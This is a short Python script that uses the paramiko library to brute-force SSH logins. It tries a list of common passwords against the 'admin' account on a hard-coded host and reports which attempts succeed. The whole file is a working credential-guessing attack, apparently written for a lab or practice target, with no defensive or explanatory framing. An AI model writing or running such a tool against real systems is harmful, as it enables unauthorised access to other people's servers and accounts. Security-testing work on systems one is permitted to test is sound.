import paramiko

def ssh_bruteforce(target, username, password_list):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    for password in password_list:
        try:
            ssh.connect(target, port=22, username=username, password=password, timeout=3)
            print(f"✅ Success: {username}:{password}")
            ssh.close()
            return
        except paramiko.AuthenticationException:
            print(f"❌ Failed: {username}:{password}")
        except Exception as e:
            print(f"⚠ Error: {e}")


if __name__ == "__main__":
    target = "10.10.117.145"
    username = "admin"
    passwords = ["123456", "password", "admin@123", "admin123"]


    ssh_bruteforce(target, username, passwords)